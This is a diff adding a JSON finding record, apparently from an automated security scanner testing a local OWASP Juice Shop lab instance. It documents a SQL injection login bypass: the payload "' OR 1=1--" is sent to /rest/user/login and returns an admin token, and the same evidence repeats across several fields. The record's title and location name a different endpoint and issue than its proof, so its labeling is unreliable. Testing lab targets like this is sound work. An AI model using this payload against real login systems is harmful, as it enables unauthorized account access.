@@ -1,0 +1,28 @@
+{
+  "id": "ev_1784855352912_765c79",
+  "type": "tool_output",
+  "source_tool": "finding",
+  "summary": "Challenge Data Exposure via API @ GET http://127.0.0.1:3010/api/Challenges",
+  "data": {
+    "kind": "proof",
+    "observation": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+    "proof": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+    "path_or_url": "GET http://127.0.0.1:3010/api/Challenges",
+    "location": "GET http://127.0.0.1:3010/api/Challenges",
+    "title": "Challenge Data Exposure via API",
+    "stdout": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+    "body_preview": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+    "capture_via": "http",
+    "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200",
+    "method": "POST",
+    "url": "http://127.0.0.1:3010/rest/user/login",
+    "status": 200,
+    "request_body": "{\"email\":\"' OR 1=1--\",\"password\":\"test\"}",
+    "request_headers": {
+      "Content-Type": "application/json"
+    },
+    "source_tool_act": "http",
+    "act_summary": "POST http://127.0.0.1:3010/rest/user/login → 200"
+  },
+  "created_at": "2026-07-24T01:09:12.912Z"
+}
